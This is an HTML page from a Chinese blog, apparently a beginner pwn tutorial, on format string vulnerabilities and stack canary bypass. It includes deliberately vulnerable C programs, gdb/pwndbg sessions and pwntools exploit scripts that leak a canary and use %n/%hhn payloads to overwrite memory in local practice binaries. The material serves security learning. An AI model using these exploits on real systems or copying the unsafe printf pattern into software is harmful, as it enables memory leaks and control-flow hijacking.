@@ -1,0 +1,822 @@
+<!DOCTYPE html>
+
+
+
+  
+
+
+<html class="theme-next gemini use-motion" lang="zh-Hans">
+<head><meta name="generator" content="Hexo 3.9.0">
+  <meta charset="UTF-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+<meta name="theme-color" content="#222">
+
+
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform">
+<meta http-equiv="Cache-Control" content="no-siteapp">
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css">
+
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css">
+
+<link href="/css/main.css?v=5.1.4" rel="stylesheet" type="text/css">
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=5.1.4">
+
+
+  <link rel="mask-icon" href="/images/logo.svg?v=5.1.4" color="#222">
+
+
+
+
+
+  <meta name="keywords" content="pwn,gdb,格式化字符串漏洞,canary,">
+
+
+
+
+
+
+
+
+
+
+<meta name="description" content="格式化字符串漏洞是因为c语言中printf的参数个数不是确定的，参数的长度也不是确定的，当printf把输入当作第一个参数直接输出的时候，输入若干格式化字符串，会增加与格式化字符串相对应的参数，会泄露出栈中的内容">
+<meta name="keywords" content="pwn,gdb,格式化字符串漏洞,canary">
+<meta property="og:type" content="article">
+<meta property="og:title" content="格式化字符串与canary保护">
+<meta property="og:url" content="http://yoursite.com/2020/03/29/格式化字符串漏洞与canary保护/index.html">
+<meta property="og:site_name" content="pukr&#39;s BLOG">
+<meta property="og:description" content="格式化字符串漏洞是因为c语言中printf的参数个数不是确定的，参数的长度也不是确定的，当printf把输入当作第一个参数直接输出的时候，输入若干格式化字符串，会增加与格式化字符串相对应的参数，会泄露出栈中的内容">
+<meta property="og:locale" content="zh-Hans">
+<meta property="og:image" content="http://yoursite.com/2020/03/29/格式化字符串漏洞与canary保护/格式化字符串1.png">
+<meta property="og:image" content="http://yoursite.com/2020/03/29/格式化字符串漏洞与canary保护/存储.png">
+<meta property="og:image" content="http://yoursite.com/2020/03/29/格式化字符串漏洞与canary保护/格式化字符串2.png">
+<meta property="og:image" content="http://yoursite.com/2020/03/29/格式化字符串漏洞与canary保护/格式化字符串3.png">
+<meta property="og:image" content="http://yoursite.com/2020/03/29/格式化字符串漏洞与canary保护/格式化字符串4.png">
+<meta property="og:image" content="http://yoursite.com/2020/03/29/格式化字符串漏洞与canary保护/canary.png">
+<meta property="og:image" content="http://yoursite.com/2020/03/29/格式化字符串漏洞与canary保护/stack.png">
+<meta property="og:image" content="http://yoursite.com/2020/03/29/格式化字符串漏洞与canary保护/canary1.png">
+<meta property="og:image" content="http://yoursite.com/2020/03/29/格式化字符串漏洞与canary保护/python.png">
+<meta property="og:image" content="http://yoursite.com/2020/03/29/格式化字符串漏洞与canary保护/确定">
+<meta property="og:image" content="http://yoursite.com/2020/03/29/格式化字符串漏洞与canary保护/小端存储.png">
+<meta property="og:updated_time" content="2020-12-05T02:51:58.275Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="格式化字符串与canary保护">
+<meta name="twitter:description" content="格式化字符串漏洞是因为c语言中printf的参数个数不是确定的，参数的长度也不是确定的，当printf把输入当作第一个参数直接输出的时候，输入若干格式化字符串，会增加与格式化字符串相对应的参数，会泄露出栈中的内容">
+<meta name="twitter:image" content="http://yoursite.com/2020/03/29/格式化字符串漏洞与canary保护/格式化字符串1.png">
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Gemini',
+    version: '5.1.4',
+    sidebar: {"position":"left","display":"post","offset":12,"b2t":false,"scrollpercent":false,"onmobile":false},
+    fancybox: true,
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    duoshuo: {
+      userId: '0',
+      author: '博主'
+    },
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+
+  <link rel="canonical" href="http://yoursite.com/2020/03/29/格式化字符串漏洞与canary保护/">
+
+
+
+
+
+  <title>格式化字符串与canary保护 | pukr's BLOG</title>
+  
+
+
+
+
+
+
+
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="zh-Hans">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/" class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">pukr's BLOG</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+      
+        <p class="site-subtitle">人类的悲欢并不相通</p>
+      
+  </div>
+
+  <div class="site-nav-toggle">
+    <button>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-home"></i> <br>
+            
+            首页
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-tags">
+          <a href="/tags/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br>
+            
+            标签
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-categories">
+          <a href="/categories/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-th"></i> <br>
+            
+            分类
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br>
+            
+            归档
+          </a>
+        </li>
+      
+
+      
+    </ul>
+  
+
+  
+</nav>
+
+
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2020/03/29/格式化字符串漏洞与canary保护/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="尘林">
+      <meta itemprop="description" content>
+      <meta itemprop="image" content="/images/zql.jpg">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="pukr's BLOG">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">格式化字符串与canary保护</h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2020-03-29T20:13:32+08:00">
+                2020-03-29
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+            <span class="post-category">
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">分类于</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/PWN入门/" itemprop="url" rel="index">
+                    <span itemprop="name">PWN入门</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <p>格式化字符串漏洞是因为c语言中printf的参数个数不是确定的，参数的长度也不是确定的，当printf把输入当作第一个参数直接输出的时候，输入若干格式化字符串，会增加与格式化字符串相对应的参数，会泄露出栈中的内容<br><a id="more"></a><br>C程序：<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">"stdafx.h"</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">"stdio.h"</span></span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">func</span><span class="params">()</span></span>&#123;</span><br><span class="line">	<span class="keyword">char</span> str1[<span class="number">10</span>];</span><br><span class="line">	<span class="built_in">scanf</span>(<span class="string">"%s"</span>,str1);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"%s\n"</span>,str1);</span><br><span class="line">	<span class="built_in">printf</span>(str1);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span>* argv[])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	func();</span><br><span class="line">	getchar();</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
+<p>明显的溢出漏洞：正常输入的话两个printf输出一样，但是超过<code>str1[10]</code>的空间的话就会覆盖返回地址。</p>
+<p><strong>格式化字符串</strong><br>输入<code>%x%x%x</code>的话，输出结果为：<br><img src="/2020/03/29/格式化字符串漏洞与canary保护/格式化字符串1.png" alt></p>
+<p>正常输出的话，堆栈中这样存储<br><img src="/2020/03/29/格式化字符串漏洞与canary保护/存储.png" alt></p>
+<p>在OD里观察到原因<br><img src="/2020/03/29/格式化字符串漏洞与canary保护/格式化字符串2.png" alt><br>把存储内容当作输入。</p>
+<p>printf函数并不知道参数个数，它的内部有个指针，用来索检格式化字符串。对于特定类型%，就去取相应参数的值，直到索检到格式化字符串结束。<br>所以尽管没有参数，上面的代码也会将format string 后面的内存储存的数据当做参数以16进制输出。这样就会造成内存泄露。</p>
+<h1 id="泄露任意地址的内存"><a href="#泄露任意地址的内存" class="headerlink" title="泄露任意地址的内存"></a>泄露任意地址的内存</h1><p>之前的方法还只是泄露栈上变量值，没法泄露变量的地址，但是如果我们知道格式化字符串在输出函数调用时是第几个参数，这里假设格式化字符串相对函数调用是第 k 个参数，那我们就可以通过如下方法来获取指定地址 addr 的内容<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">linux下：</span><br><span class="line">addr%k$p</span><br></pre></td></tr></table></figure></p>
+<p>在Windows下把输入换成下面的字符串，确定格式化字符串是第几个参数：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">AAAAA%8x-%8x-%8x-%8x-%8x-%8x-%8x-%8x-%8x-%8x-%8x-%8x-%8x-%8x-%8x-%8x-%8x-%8x-%8x-%8x-%8x-%8x-%8x-%8x-%8x-%8x-%8x-%8x-</span><br></pre></td></tr></table></figure></p>
+<p>则输出为：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">AAAAA%8x-%8x-%8x-%8x-%8x-%8x-%8x-%8x-%8x-%8x-%8x-%8x-%8x-%8x-%8x-%8x-%8x-%8x-%8x-%8x-%8x-%8x-%8x-%8x-%8x-%8x-%8x-%8x-</span><br><span class="line">AAAAA  19ff30-  4011d0-  2ea000-cccccccc-cccccccc-cccccccc-cccccccc-cccccccc-cccccccc-cccccccc-cccccccc-cccccccc-cccccccc-cccccccc-cccccccc-cccccccc-cccccccc-cccccccc-cccccccc-41414141-78382541-7838252d-7838252d-7838252d-7838252d-7838252d-7838252d-7838252d-</span><br></pre></td></tr></table></figure></p>
+<p><img src="/2020/03/29/格式化字符串漏洞与canary保护/格式化字符串3.png" alt></p>
+<p><img src="/2020/03/29/格式化字符串漏洞与canary保护/格式化字符串4.png" alt></p>
+<p>输出的内容和前面的输入重复了，就说明可以确定是第几个参数。但是不排除栈上有些其他变量也是这个值，所以可以用一些其他的字符进行再次尝试。</p>
+<p>根据这个原理，切换到linux下进行测试。<br>注：%<number>$x 是直接读取从当前位置往下数第number个位置的参数，同样可以用在$n，$d，$p等等。</number></p>
+<p>gcc打开canary保护<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">gcc -no-pie -fstack-protector -m32 -o test1.exe test1.c</span><br><span class="line">gdb test1.exe</span><br></pre></td></tr></table></figure></p>
+<p>在pwndbg里进行：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; i b</span><br><span class="line">No breakpoints or watchpoints.</span><br><span class="line">pwndbg&gt; b func</span><br><span class="line">Breakpoint 2 at 0x80491c1</span><br><span class="line">pwndbg&gt; i b</span><br><span class="line">Num     Type           Disp Enb Address    What</span><br><span class="line">2       breakpoint     keep y   0x080491c1 &lt;func+4&gt;</span><br></pre></td></tr></table></figure></p>
+<p>依次执行r和n指令，直到看到一行这样的指令：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0x80491cf &lt;func+18&gt;    mov    eax, dword ptr gs:[0x14] &lt;0x804c000&gt;</span><br></pre></td></tr></table></figure></p>
+<p><img src="/2020/03/29/格式化字符串漏洞与canary保护/canary.png" alt></p>
+<p>查看内容：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x/x 0x804c000</span><br><span class="line">0x804c000:	0x0804bf14</span><br></pre></td></tr></table></figure></p>
+<p>即插入canary的代码。查看canary：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; canary</span><br><span class="line">AT_RANDOM = 0xffffd4bb # points to (not masked) global canary value</span><br><span class="line">Canary    = 0xe1ab7500</span><br><span class="line">Found valid canaries on the stacks:</span><br><span class="line">00:0000│   0xffffd27c ◂— 0xe1ab7500</span><br></pre></td></tr></table></figure></p>
+<p>所以思路是：读取到canary的值并加入到payload中，在canary的地址放入原来canary的值。</p>
+<p>在进行到read函数时，查看堆栈：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">stack 20</span><br></pre></td></tr></table></figure></p>
+<p><img src="/2020/03/29/格式化字符串漏洞与canary保护/stack.png" alt><br>可以看到偏移为0x2c即44,4位一组偏移为11个内存单元。<br>输入：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">%11$8x</span><br></pre></td></tr></table></figure></p>
+<p>一直n下去直到printf函数：<br><img src="/2020/03/29/格式化字符串漏洞与canary保护/canary1.png" alt><br>获得了canary的值，并以16进制形式输出。</p>
+<p>exp：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p=process(<span class="string">"./test.exe"</span>)</span><br><span class="line">p.sendline(<span class="string">"%11$08x"</span>)</span><br><span class="line">canary=p.recv()[:<span class="number">8</span>]</span><br><span class="line">print(canary)</span><br><span class="line"></span><br><span class="line">canary=canary.decode(<span class="string">"hex"</span>)[::<span class="number">-1</span>]</span><br><span class="line"></span><br><span class="line">coffset=<span class="number">4</span>*<span class="number">4</span></span><br><span class="line">roffset=<span class="number">3</span>*<span class="number">4</span></span><br><span class="line">raddr=p32(<span class="number">0x8049192</span>)</span><br><span class="line">payload=coffset*<span class="string">'a'</span>+canary+roffset*<span class="string">'a'</span>+raddr</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure></p>
+<p><img src="/2020/03/29/格式化字符串漏洞与canary保护/python.png" alt></p>
+<h1 id="覆盖栈内存"><a href="#覆盖栈内存" class="headerlink" title="覆盖栈内存"></a>覆盖栈内存</h1><blockquote><p>%n与其他格式说明符号不同。%n不向printf传递格式化信息，而是令printf把自己到该点已打出的字符总数放到相应变元指向的整形变量中。因此%n对于抄的变元必须是整形指针。</p>
+<p>对printf调用返回之后，%n对于变元指向的变量中将包含有一个整数值，表示出现%n时已经由该次printf调用输出的字符数。</p>
+<p>printf(“this%n is a test\n”,&amp;count);//调用后count为4</p>
+</blockquote>
+<p>C语言代码：<br>（和攻防世界pwn新手区第一题hello_pwn类似）<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="keyword">int</span> a = <span class="number">123</span>, b = <span class="number">456</span>;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  <span class="keyword">int</span> c = <span class="number">789</span>;</span><br><span class="line">  <span class="keyword">char</span> s[<span class="number">100</span>];</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"%p\n"</span>, &amp;c);</span><br><span class="line">  <span class="built_in">scanf</span>(<span class="string">"%s"</span>, s);</span><br><span class="line">  <span class="built_in">printf</span>(s);</span><br><span class="line">  <span class="keyword">if</span> (c == <span class="number">16</span>) &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"modified c."</span>);</span><br><span class="line">  &#125; <span class="keyword">else</span> <span class="keyword">if</span> (a == <span class="number">2</span>) &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"modified a for a small number."</span>);</span><br><span class="line">  &#125; <span class="keyword">else</span> <span class="keyword">if</span> (b == <span class="number">0x12345678</span>) &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"modified b for a big number!"</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
+<p>希望通过改变C的值输出<code>modified c.</code>。而%n不输出字符，但是把已经成功输出的字符个数写入对应的整型指针参数所指的变量。只要变量对应的地址可写，就可以利用格式化字符串来改变其对应的值。</p>
+<p>步骤：<br>1.确定覆盖地址<br>2.确定偏移大小<br>3.覆盖</p>
+<p><img src="/2020/03/29/格式化字符串漏洞与canary保护/确定" alt><br>可更改内存单元是第6个参数所在，而输出c的地址（4位）后，还需要12位才凑够16。故payload构成为：addr_c+’a’* 12+’%6$n’</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p = process(<span class="string">'./string1'</span>)</span><br><span class="line"></span><br><span class="line">addr_c = int(p.recvuntil(<span class="string">'\n'</span>,drop=<span class="literal">True</span>), <span class="number">16</span>)</span><br><span class="line"><span class="keyword">print</span> hex(addr_c)</span><br><span class="line">payload = p32(addr_c)+<span class="string">'a'</span>*<span class="number">12</span>+<span class="string">'%6$n'</span></span><br><span class="line">p.sendline(payload)</span><br><span class="line"><span class="keyword">print</span> p.recv()</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+<p>这里，recvuntil是接收输出直到’\n’为止，<code>drop=True</code>是指丢弃掉最后until的’\n’字符。就接收到了c的地址。</p>
+<p>但是这样的payload有个问题，把4字或8字的地址放在前面，所以覆盖字节至少也比4大。</p>
+<p>C语言代码：<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="keyword">int</span> a = <span class="number">123</span>, b = <span class="number">456</span>;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  <span class="keyword">int</span> c = <span class="number">789</span>;</span><br><span class="line">  <span class="keyword">char</span> s[<span class="number">100</span>];</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"%p\n"</span>, &amp;c);</span><br><span class="line">  <span class="built_in">scanf</span>(<span class="string">"%s"</span>, s);</span><br><span class="line">  <span class="built_in">printf</span>(s);</span><br><span class="line">  <span class="keyword">if</span> (c == <span class="number">3</span>) &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"modified c."</span>);</span><br><span class="line">  &#125; <span class="keyword">else</span> <span class="keyword">if</span> (a == <span class="number">2</span>) &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"modified a for a small number."</span>);</span><br><span class="line">  &#125; <span class="keyword">else</span> <span class="keyword">if</span> (b == <span class="number">0x12345678</span>) &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"modified b for a big number!"</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
+<p>修改为c == 3输出<code>modified c.</code></p>
+<p>可以这样修改：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p = process(<span class="string">'./str2'</span>)</span><br><span class="line"></span><br><span class="line">addr_c = int(p.recvuntil(<span class="string">'\n'</span>,drop=<span class="literal">True</span>), <span class="number">16</span>)</span><br><span class="line"><span class="keyword">print</span> hex(addr_c)</span><br><span class="line">payload = <span class="string">'aaa%8$na'</span>+p32(addr_c)</span><br><span class="line">p.sendline(payload)</span><br><span class="line"><span class="keyword">print</span> p.recv()</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure></p>
+<p>其中，4位4位一个内存单元。<code>aaa%</code>是第6个参数，<code>8$na</code>是第7个参数，addr_c就是第8个参数了。所以<code>%8$n</code>前有3个字符，再取第8个参数的地址（%后的数字设置为8），就将addr_c的内容覆盖为3了。</p>
+<p><strong>这里掌握的小技巧：没有必要把地址放在最前面，只需要找到它对应的偏移就可以。</strong></p>
+<p>若是覆盖大数字，变量在内存中都是以字节的格式存储的，在 x86、x64 中是按照小端存储的，格式化字符串里面有两个标志用的上了：<br><img src="/2020/03/29/格式化字符串漏洞与canary保护/小端存储.png" alt></p>
+<blockquote><p>h：对于整数类型，printf 期待一个从 short 提升的 int 尺寸的整型参数<br>hh：对于整型类型，printf 期待一个从 char 提升的 int 尺寸的整形参数</p>
+</blockquote>
+<p>意思是说<code>hhn</code>写入的就是单字节，<code>hn</code>写入的就是双字节。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">sh = process(<span class="string">'./overwrite'</span>)</span><br><span class="line">b_addr=<span class="number">0x0804A028</span></span><br><span class="line">payload = p32(b_addr)+p32(b_addr+<span class="number">1</span>)+p32(b_addr+<span class="number">2</span>)+p32(b_addr+<span class="number">3</span>)</span><br><span class="line">payload += <span class="string">'%104x'</span>+<span class="string">'%6$hhn'</span>+<span class="string">'%222x'</span>+<span class="string">'%7$hhn'</span>+<span class="string">'%222x'</span>+<span class="string">'%8$hhn'</span>+<span class="string">'%222x'</span>+<span class="string">'%9$hhn'</span></span><br><span class="line">sh.sendline(payload)</span><br><span class="line"><span class="comment">#sh.sendline(fmtstr_payload(6, &#123;0x804A028:0x12345678&#125;))</span></span><br><span class="line"><span class="comment">#pwntools带着一个函数,很方便</span></span><br><span class="line"><span class="keyword">print</span> sh.recv()</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>
+<p>地址经过前面的<code>p32()</code>打包后，会变成4个字符，4*4+104=120，即0x78。120+222=342，即0x156,然后依次是：0x234、0x312，又因为 hh 是写入单字节的，又是小端存储，也就是只能取后边两个，所以连起来就是 0x12345678。</p>
+<p>参考文章<a href="https://www.yuque.com/hxfqg9/hs80y0/aedgn4" target="_blank" rel="noopener">PWN入门（格式化字符串）</a></p>
+
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+        <div class="post-tags">
+          
+            <a href="/tags/pwn/" rel="tag"># pwn</a>
+          
+            <a href="/tags/gdb/" rel="tag"># gdb</a>
+          
+            <a href="/tags/格式化字符串漏洞/" rel="tag"># 格式化字符串漏洞</a>
+          
+            <a href="/tags/canary/" rel="tag"># canary</a>
+          
+        </div>
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2020/03/26/定位溢出点的方法/" rel="next" title="定位溢出点、python加载的方法">
+                <i class="fa fa-chevron-left"></i> 定位溢出点、python加载的方法
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+              <a href="/2020/03/31/ret2shellcode/" rel="prev" title="ret2shellcode">
+                ret2shellcode <i class="fa fa-chevron-right"></i>
+              </a>
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
+
+
+          </div>
+          
+
+
+          
+
+  
+
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            文章目录
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            站点概览
+          </li>
+        </ul>
+      
+
+      <section class="site-overview-wrap sidebar-panel">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+            
+              <img class="site-author-image" itemprop="image" src="/images/zql.jpg" alt="尘林">
+            
+              <p class="site-author-name" itemprop="name">尘林</p>
+              <p class="site-description motion-element" itemprop="description">势，只会裹挟随波逐流之人。一心既定，便不问大势所趋。</p>
+          </div>
+
+          <nav class="site-state motion-element">
+
+            
+              <div class="site-state-item site-state-posts">
+              
+                <a href="/archives/">
+              
+                  <span class="site-state-item-count">52</span>
+                  <span class="site-state-item-name">日志</span>
